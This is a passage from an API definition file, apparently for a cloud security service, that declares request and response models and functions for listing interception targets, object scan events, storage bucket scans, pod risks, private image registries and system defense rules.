  statusCode: int32(name='statusCode'),
  body: ListInterceptionRulePageResponseBody(name='body'),
}

async function listInterceptionRulePage(request: ListInterceptionRulePageRequest): ListInterceptionRulePageResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListInterceptionRulePage', 'POST', '/', 'json', false, 'json', request);
}

model ListInterceptionTargetPageRequest {
  appName?: string(name='AppName', description='The name of the application to which the network object belongs.', example='frontend', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  imageList?: [ string ](name='ImageList', description='The images of the network object.', position='Query'),
  namespace?: string(name='Namespace', description='The namespace to which the network object belongs.', example='default', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20', position='Query'),
  tagList?: [ string ](name='TagList', description='The labels specified for the network object.', position='Query'),
  targetName?: string(name='TargetName', description='The name of the network object.', example='source-test-obj-0****', position='Query'),
  targetType?: string(name='TargetType', description='The type of the network object. Valid values:

*   IMAGE', example='IMAGE', position='Query'),
}

model ListInterceptionTargetPageResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6B****'),
  ruleTargetList?: [ 
    {
      appName?: string(name='AppName', description='The name of the application of the network object.', example='frontend'),
      clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c3e2eae03eb064d2ebf940cd5e1b17****'),
      clusterName?: string(name='ClusterName', description='The name of the container cluster.', example='sas-test-cnnf'),
      imageList?: [ string ](name='ImageList', description='The images of the network object.'),
      namespace?: string(name='Namespace', description='The namespace to which the network object belongs.', example='default'),
      ruleType?: string(name='RuleType', description='The type of the rule. Valid value:

*   customize: custom rule', example='customize'),
      tagList?: [ string ](name='TagList', description='The tags specified for the network object.'),
      targetId?: long(name='TargetId', description='The ID of the network object.

> You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the IDs of network objects.', example='400914'),
      targetName?: string(name='TargetName', description='The name of the network object.', example='destination-test-obj-Na3cF'),
      targetType?: string(name='TargetType', description='The type of the network object. Valid value:

*   IMAGE', example='IMAGE'),
    }
  ](name='RuleTargetList', description='An array that consists of the network objects.'),
}

model ListInterceptionTargetPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInterceptionTargetPageResponseBody(name='body'),
}

async function listInterceptionTargetPage(request: ListInterceptionTargetPageRequest): ListInterceptionTargetPageResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListInterceptionTargetPage', 'POST', '/', 'json', false, 'json', request);
}

model ListObjectScanEventRequest {
  bucketName?: string(name='BucketName', example='ltrbuck****', position='Query'),
  currentPage: int32(name='CurrentPage', example='1', position='Query'),
  eventName?: string(name='EventName', example='WebShell', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  md5?: string(name='Md5', example='0552c44e243abdea1729d4507bce****', position='Query'),
  ossKey?: string(name='OssKey', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****', position='Query'),
  pageSize: int32(name='PageSize', example='20', position='Query'),
  riskLevel?: string(name='RiskLevel', example='low', position='Query'),
  source?: string(name='Source', example='OSS', position='Query'),
  timeEnd?: long(name='TimeEnd', example='1683862286000', position='Query'),
  timeStart?: long(name='TimeStart', example='1683603086000', position='Query'),
}

model ListObjectScanEventResponseBody = {
  data?: [ 
    {
      bucketName?: string(name='BucketName', example='hz-new01****'),
      details?: [ 
        {
          name?: string(name='Name', example='DownloadUrl'),
          nameDisplay?: string(name='NameDisplay', example='DownloadUrl'),
          type?: string(name='Type', example='html'),
          value?: string(name='Value', example='http://gcx.cn-hangzhou.aliyuncs.com/****'),
          valueDisplay?: string(name='ValueDisplay', example='http://gcx.cn-hangzhou.aliyuncs.com/****'),
        }
      ](name='Details'),
      displaySandboxResult?: string(name='DisplaySandboxResult', example='true'),
      eventId?: long(name='EventId', example='911273'),
      eventName?: string(name='EventName', example='WebShell'),
      filePath?: string(name='FilePath', example='/usr/local****'),
      firstTime?: long(name='FirstTime', example='1694576692000'),
      lastTime?: long(name='LastTime', example='1694576692000'),
      md5?: string(name='Md5', example='5b394b54ca632fe51c4ab4a6dbaf****'),
      ossKey?: string(name='OssKey', example='1/2023/07/21/10/18/16899059356518bcf6c64-a04e-492d-a421-4ae8b888****'),
      riskLevel?: string(name='RiskLevel', example='medium'),
      sha1?: string(name='Sha1', example='3c01bdbb26f358bab27f267924aa2c9a03fc****'),
      sha256?: string(name='Sha256', example='3a6fed5fc11392b3ee9f81caf017b48640d7458766a8eb0382899a605b41****'),
      source?: string(name='Source', example='OSS'),
    }
  ](name='Data'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='253'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='7BC55C8F-226E-5AF5-9A2C-2EC43864****'),
}

model ListObjectScanEventResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListObjectScanEventResponseBody(name='body'),
}

async function listObjectScanEvent(request: ListObjectScanEventRequest): ListObjectScanEventResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListObjectScanEvent', 'POST', '/', 'json', false, 'json', request);
}

model ListOssBucketRequest {
  bucketName?: string(name='BucketName', example='iboxpublic****', position='Query'),
  lang?: string(name='Lang', example='en', position='Query'),
}

model ListOssBucketResponseBody = {
  data?: [ 
    {
      bucketName?: string(name='BucketName', example='iboxpublic****'),
      message?: string(name='Message', example='Unsupported Region。'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      storageClass?: string(name='StorageClass', example='Standard'),
      support?: boolean(name='Support', example='true'),
    }
  ](name='Data'),
  requestId?: string(name='RequestId', example='3956048F-9D73-5EDB-834B-4827BB48****'),
}

model ListOssBucketResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListOssBucketResponseBody(name='body'),
}

async function listOssBucket(request: ListOssBucketRequest): ListOssBucketResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListOssBucket', 'POST', '/', 'json', false, 'json', request);
}

model ListOssBucketScanInfoRequest {
  bucketName?: string(name='BucketName', example='iboxpublic****', position='Query'),
  currentPage: int32(name='CurrentPage', example='1', position='Query'),
  fuzzBucketName?: string(name='FuzzBucketName', example='test', position='Query'),
  hasRisk?: int32(name='HasRisk', example='1', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  pageSize: int32(name='PageSize', example='20', position='Query'),
  status?: int32(name='Status', example='1', position='Query'),
}

model ListOssBucketScanInfoResponseBody = {
  data?: [ 
    {
      bucketName?: string(name='BucketName', example='hz-new02****'),
      highRisk?: long(name='HighRisk', example='0'),
      lastScanEndTime?: long(name='LastScanEndTime', example='1698388233883'),
      lastScanTime?: long(name='LastScanTime', example='1698388233883'),
      lowRisk?: long(name='LowRisk', example='0'),
      mediumRisk?: long(name='MediumRisk', example='0'),
      message?: string(name='Message', example='Unsupported Region。'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      scanObject?: long(name='ScanObject', example='100'),
      scanned?: boolean(name='Scanned', example='false'),
      status?: int32(name='Status', example='1'),
      storageClass?: string(name='StorageClass', example='Archive'),
      support?: boolean(name='Support', example='true'),
      totalObject?: long(name='TotalObject', example='100'),
    }
  ](name='Data'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='165'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='6C578F36-92D2-552C-8AA0-86EB1AC2****'),
}

model ListOssBucketScanInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListOssBucketScanInfoResponseBody(name='body'),
}

async function listOssBucketScanInfo(request: ListOssBucketScanInfoRequest): ListOssBucketScanInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListOssBucketScanInfo', 'POST', '/', 'json', false, 'json', request);
}

model ListPluginForUuidRequest {
  types?: [ string ](name='Types', description='The plug-in types.', shrink='simple', position='Query'),
  uuid: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='bdb7071f-129d-4ceb-af80-4cf70c4571c6', position='Query'),
}

model ListPluginForUuidResponseBody = {
  aegisUuidTargetPluginConfigList?: [ 
    {
      aegisSuspiciousConfigList?: [ 
        {
          config?: boolean(name='Config', description='Indicates whether the plug-in is enabled. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
          msg?: string(name='Msg', description='The message that indicates whether you are authorized to install the plug-in on your server or whether the plug-in is installed on your server. Valid values:

*   **authorized**: authorized
*   **unauthorized**: unauthorized
*   **unbind**: not installed
*   **nonsupport**: not supported', example='authorized'),
          overallConfig?: boolean(name='OverallConfig', description='Indicates whether the plug-in is globally configured. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
          type?: string(name='Type', description='The name of the plug-in. Valid values:

*   **alihips**: trojan-specific prevention
*   **alisecguard**: attack-specific prevention
*   **alinet**: defense against attacks on servers', example='alisecguard'),
        }
      ](name='AegisSuspiciousConfigList', description='An array that consists of the configurations of plug-ins.'),
      pluginInstallCode?: string(name='PluginInstallCode', description='The installation code of the plug-in.', example='k5O5nd'),
      pluginName?: string(name='PluginName', description='The name of the plug-in. Valid values:

*   **alihips**: trojan-specific prevention
*   **alisecguard**: attack-specific prevention
*   **alinet**: defense against attacks on servers', example='alisecguard'),
      pluginOnlineInstalled?: boolean(name='PluginOnlineInstalled', description='Indicates whether the plug-in is installed. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      pluginOnlineStatus?: boolean(name='PluginOnlineStatus', description='Indicates whether the plug-in is online. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      pluginVersion?: string(name='PluginVersion', description='The version of the plug-in.', example='00_10'),
    }
  ](name='AegisUuidTargetPluginConfigList', description='An array that consists of the information about the plug-ins.'),
  code?: int32(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model ListPluginForUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPluginForUuidResponseBody(name='body'),
}

async function listPluginForUuid(request: ListPluginForUuidRequest): ListPluginForUuidResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListPluginForUuid', 'POST', '/', 'json', false, 'json', request);
}

model ListPodRiskRequest {
  appName?: string(name='AppName', description='The name of the application.', example='nginx1', position='Query'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~182997~~) operation to query the IDs of container clusters.', example='c314aa5b2f208461dad821cdfed82****', position='Query'),
  currentPage?: long(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  namespace?: string(name='Namespace', description='The namespace of the Kubernetes cluster.', example='taas', position='Query'),
  pageSize?: long(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20', position='Query'),
  podName?: string(name='PodName', description='The name of the pod.', example='abcd-84898334227-p****', position='Query'),
}

model ListPodRiskResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='2-'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='29'),
  }(name='PageInfo', description='The pagination information.'),
  podRiskList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are generated for the pod.', example='10'),
      clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c1d903a628af043659a043af59d89****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='test66'),
      createTime?: long(name='CreateTime', description='The timestamp that indicates the time when the pod was created. Unit: milliseconds.', example='1644283112720'),
      hcCount?: int32(name='HcCount', description='The number of baseline risk items that are detected in the pod.', example='1'),
      instanceId?: string(name='InstanceId', description='The instance ID of the node.', example='i-7yvdq597****'),
      namespace?: string(name='Namespace', description='The namespace of the Kubernetes cluster.', example='kube-system'),
      nodeName?: string(name='NodeName', description='The name of the node.', example='test'),
      pod?: string(name='Pod', description='The name of the pod.', example='expoit-xxx-b****'),
      podIp?: string(name='PodIp', description='The IP address of the pod.', example='172.0.XXX.XXX'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected in the pod.', example='1'),
    }
  ](name='PodRiskList', description='An array that consists of the risks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='94254AD7-5026-5847-833B-403C2326BD6E'),
}

model ListPodRiskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPodRiskResponseBody(name='body'),
}

async function listPodRisk(request: ListPodRiskRequest): ListPodRiskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListPodRisk', 'POST', '/', 'json', false, 'json', request);
}

model ListPrivateRegistryListRequest {
  registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**: Container Registry
*   **harbor**: Harbor
*   **quay**: Quay
*   **CI/CD**: Jenkins', example='harbor', position='Query'),
}

model ListPrivateRegistryListResponseBody = {
  imageRegistryInfos?: [ 
    {
      aliUid?: long(name='AliUid', description='The ID of the user.', example='1766185894******'),
      domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
      id?: long(name='Id', description='The ID of the image repository.', example='66485'),
      jenkinsEnv?: string(name='JenkinsEnv', description='The information about the Jenkins environment.', example='JenkinsInfo'),
      netType?: long(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: VPC', example='1'),
      password?: string(name='Password', description='The password used to log on to the image repository.', example='Harbor******'),
      persistenceDay?: long(name='PersistenceDay', description='The number of days during which assets can be retained.', example='90'),
      protocolType?: long(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='1'),
      regionId?: string(name='RegionId', description='The region ID of the server.', example='cn-hangzhou'),
      registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='114.55.XXX.XXX'),
      registryName?: string(name='RegistryName', description='The alias of the image repository.', example='test1'),
      registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **acr**: Container Registry
*   **harbor**: Harbor
*   **quay**: Quay
*   **CI/CD**: Jenkins', example='harbor'),
      registryVersion?: string(name='RegistryVersion', description='The version of the image repository. Valid values:

*   **V1**: V1.0
*   **V2**: V2.0', example='V1'),
      token?: string(name='Token', description='The authentication token of the user.', example='0da12bce-cc36-4c48-b3e6-2215fc3a****'),
      transPerHour?: int32(name='TransPerHour', description='The number of images that can be scanned per hour.', example='30'),
      userName?: string(name='UserName', description='The username used to log on to the image repository.', example='RegistryUser'),
      vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC).', example='vpc-bp12897gqrex01zn0****'),
      whiteList?: string(name='WhiteList', description='The whitelist of IP addresses.', example='100.104.XXX.XXX'),
    }
  ](name='ImageRegistryInfos', description='An array that consists of the image repositories.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
}

model ListPrivateRegistryListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPrivateRegistryListResponseBody(name='body'),
}

async function listPrivateRegistryList(request: ListPrivateRegistryListRequest): ListPrivateRegistryListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListPrivateRegistryList', 'POST', '/', 'json', false, 'json', request);
}

model ListPrivateRegistryTypeRequest {
  lang?: string(name='Lang', description='请求和接收消息的语言类型。取值：
- **zh**：中文
- **en**：英文', example='zh', position='Query'),
}

model ListPrivateRegistryTypeResponseBody = {
  registryTypeInfos?: [ 
    {
      count?: long(name='Count', description='The number of image repositories.', example='2'),
      registryType?: string(name='RegistryType', description='The name of the image repository type. Valid values:

*   **acr**: Container Registry
*   **harbor**: Harbor
*   **quay**: Quay
*   **CI/CD**: Jenkins', example='harbor'),
    }
  ](name='RegistryTypeInfos', description='An array that consists of image repository types.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model ListPrivateRegistryTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPrivateRegistryTypeResponseBody(name='body'),
}

async function listPrivateRegistryType(request: ListPrivateRegistryTypeRequest): ListPrivateRegistryTypeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListPrivateRegistryType', 'POST', '/', 'json', false, 'json', request);
}

model ListQueryRaspAppInfoRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**
*   **en**', example='zh', position='Query'),
  uuids?: string(name='Uuids', description='The UUIDs of the RASP-enabled applications. Separate multiple UUIDs with commas (,).', example='6541631a-7d47-41fd-9fef-9518113f****', position='Query'),
}

model ListQueryRaspAppInfoResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: [ 
    {
      raspAppName?: string(name='RaspAppName', description='The name of the RASP-enabled application.', example='rasp-app'),
      raspOnlineStatus?: int32(name='RaspOnlineStatus', description='The online status of the RASP-enabled applications. Valid values:

*   **0**: All RASP-enabled applications are online.
*   **1**: Part of the RASP-enabled applications are online.
*   **2**: All RASP-enabled applications are offline.', example='0'),
      raspStatus?: string(name='RaspStatus', description='The installation status of the RASP-enabled application. Valid values:

*   **SUCCESS**: The RASP-enabled application is installed.
*   **FAIL**: The RASP-enabled application fails to be installed.
*   **INSTALL**: The RASP-enabled application is being installed.', example='SUCCESS'),
      result?: string(name='Result', description='The result returned if the push fails.', example='AGENT_OFFLINE'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data', description='The installation information of the RASP-enabled application.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The additional information that is returned.', example='successful'),
  requestId?: string(name='RequestId', description='The unique ID of the request, which is used to locate and troubleshoot issues.', example='1A975D03-5F49-5354-B2CB-3918D5DA431A'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListQueryRaspAppInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListQueryRaspAppInfoResponseBody(name='body'),
}

async function listQueryRaspAppInfo(request: ListQueryRaspAppInfoRequest): ListQueryRaspAppInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListQueryRaspAppInfo', 'POST', '/', 'json', false, 'json', request);
}

model ListRuleTargetAllRequest {
  clusterId: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~182997~~) operation to query the IDs of container clusters.', example='cfa7e2fb8c221483ba59e098c34c6****', position='Query'),
}

model ListRuleTargetAllResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
  ruleTargetList?: [ 
    {
      targetId?: long(name='TargetId', description='The ID of the network object.', example='301944'),
      targetName?: string(name='TargetName', description='The name of the network object.', example='source-test-obj-xFKcx'),
      targetType?: string(name='TargetType', description='The type of the object. Valid values:

*   IMAGE', example='IMAGE'),
    }
  ](name='RuleTargetList', description='An array that consists of the network objects.'),
}

model ListRuleTargetAllResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListRuleTargetAllResponseBody(name='body'),
}

async function listRuleTargetAll(request: ListRuleTargetAllRequest): ListRuleTargetAllResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListRuleTargetAll', 'POST', '/', 'json', false, 'json', request);
}

model ListSupportObjectSuffixRequest {
}

model ListSupportObjectSuffixResponseBody = {
  data?: [ string ](name='Data'),
  requestId?: string(name='RequestId', example='571B2642-BF51-5BDD-906B-D2340DB9****'),
}

model ListSupportObjectSuffixResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSupportObjectSuffixResponseBody(name='body'),
}

async function listSupportObjectSuffix(request: ListSupportObjectSuffixRequest): ListSupportObjectSuffixResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListSupportObjectSuffix', 'POST', '/', 'json', false, 'json', request);
}

model ListSystemAggregationRulesRequest {
  aggregationIds?: [ int32 ](name='AggregationIds', description='The IDs of the aggregation types.', position='Query'),
  currentPage: int32(name='CurrentPage', description='The number of the page to return.', example='1', minimum=1, maximum=1000, position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page.', example='20', minimum=10, maximum=1000, position='Query'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='Rule\\*\\*\\*\\*', position='Query'),
  ruleTypes?: [ int32 ](name='RuleTypes', description='The types of the rules.', position='Query'),
  systemType?: int32(name='SystemType', description='The type of the operating system. Valid values:

*   **2**: Windows
*   **1**: Linux
*   **0**: all', example='0', position='Query'),
}

model ListSystemAggregationRulesResponseBody = {
  aggregationList?: [ 
    {
      id?: int32(name='Id', description='The ID of the aggregation type.', example='1'),
      name?: string(name='Name', description='The name of the aggregation type.', example='Remote control\\*\\*\\*\\*'),
      ruleCount?: int32(name='RuleCount', description='The number of rules that are of the aggregation type.', example='0'),
    }
  ](name='AggregationList', description='An array that consists of the details about the aggregation types.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='30'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6800B790-B10A-5C2F-BEB3-F1D5CE61****'),
}

model ListSystemAggregationRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemAggregationRulesResponseBody(name='body'),
}

async function listSystemAggregationRules(request: ListSystemAggregationRulesRequest): ListSystemAggregationRulesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListSystemAggregationRules', 'GET', '/', 'json', false, 'json', request);
}

model ListSystemClientRuleTypesRequest {
}

model ListSystemClientRuleTypesResponseBody = {
  requestId?: string(name='RequestId', example='79CFF74D-E967-5407-8A78-EE03B925****'),
  ruleTypes?: [ string ](name='RuleTypes'),
}

model ListSystemClientRuleTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemClientRuleTypesResponseBody(name='body'),
}

async function listSystemClientRuleTypes(request: ListSystemClientRuleTypesRequest): ListSystemClientRuleTypesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListSystemClientRuleTypes', 'POST', '/', 'json', false, 'json', request);
}

model ListSystemClientRulesRequest {
  aggregationIds?: [ int32 ](name='AggregationIds', description='The IDs of the aggregation types for rules.', position='Query'),
  currentPage: int32(name='CurrentPage', description='The number of the page to return.', example='1', minimum=1, maximum=1000, position='Query'),
  isContainer?: int32(name='IsContainer', description='Specifies whether to query only container images. Valid values:

*   **0**: no
*   **1**: yes', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page.', example='20', minimum=10, maximum=1000, position='Query'),
  ruleName?: string(name='RuleName', description='The name of the system defense rule.', example='Rule\\*\\*\\*\\*', position='Query'),
  ruleTypes?: [ int32 ](name='RuleTypes', description='The types of the system defense rules.', position='Query'),
  systemType?: int32(name='SystemType', description='The type of the OS. Valid values:

*   **2**: Windows
*   **1**: Linux
*   **0**: all types', example='0', position='Query'),
}

model ListSystemClientRulesResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='17'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C43CA30F-EF67-51BB-8C95-F31B8303****'),
  ruleList?: [ 
    {
      aggregationName?: string(name='AggregationName', description='The name of the aggregation type for the system defense rule.', example='Initial entry'),
      description?: string(name='Description', description='The description of the system defense rule.', example='Supports alerting or blocking of images that have high-risk vulnerabilities\\*\\*\\*\\*'),
      platform?: string(name='Platform', description='The type of the OS. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux'),
      policies?: [ 
        {
          policyKey?: string(name='PolicyKey', description='The policy key.', example='system_auto_****'),
          policyName?: string(name='PolicyName', description='The name of the policy.', example='System self-starting task\\*\\*\\*\\*'),
        }
      ](name='Policies', description='An array that consists of policies.'),
      ruleId?: long(name='RuleId', description='The ID of the system defense rule.', example='30****'),
      ruleName?: string(name='RuleName', description='The name of the system defense rule.', example='Rule\\*\\*\\*\\*'),
      ruleType?: int32(name='RuleType', description='The type of the system defense rule. Valid values:

*   **1**: alihips
*   **2**: alinet
*   **3**: alidetect
*   **4**: alisecguard', example='alihips'),
      status?: int32(name='Status', description='The status of the system defense rule. Valid values:

*   **online**: enabled
*   **offline**: disabled', example='online'),
      switchId?: string(name='SwitchId', description='The switch ID of the system defense rule.', example='USER-ENABLE-SWITCH-TYPE_****'),
    }
  ](name='RuleList', description='An array that consists of the system defense rules.'),
}

model ListSystemClientRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemClientRulesResponseBody(name='body'),
}

async function listSystemClientRules(request: ListSystemClientRulesRequest): ListSystemClientRulesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListSystemClientRules', 'POST', '/', 'json', false, 'json', request);
}

model ListSystemRuleAggregationTypesRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: zh. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
}

model ListSystemRuleAggregationTypesResponseBody = {
  aggregationTypeList?: [ 
    {
      id?: int32(name='Id', description='The ID of the aggregation type.', example='1'),
      name?: string(name='Name', description='The name of the aggregation type.', example='Remote control\\*\\*\\*\\*'),
    }
  ](name='AggregationTypeList', description='An array that consists of the aggregation types.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1427F3BE-8A7E-57F9-BD4E-590B00D2****'),
}

model ListSystemRuleAggregationTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemRuleAggregationTypesResponseBody(name='body'),
}

async function listSystemRuleAggregationTypes(request: ListSystemRuleAggregationTypesRequest): ListSystemRuleAggregationTypesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListSystemRuleAggregationTypes', 'GET', '/', 'json', false, 'json', request);
}

model ListUninstallAegisMachinesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='4', position='Query'),
  os?: string(name='Os', description='The operating system of the server.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **osType**, the value of the **Values** parameter indicates an operating system.', example='linux', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **5**.', example='5', position='Query'),
  regionIdStr?: string(name='RegionIdStr', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou', position='Query'),
  regionNo?: string(name='RegionNo', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou', position='Query'),
  remark?: string(name='Remark', description='The information about the server that you want to query. The value can be the name or the public IP address of the server.', example='172.20.XX.XX', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='180.113.XX.XX', position='Query'),
  vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0', position='Query'),
}

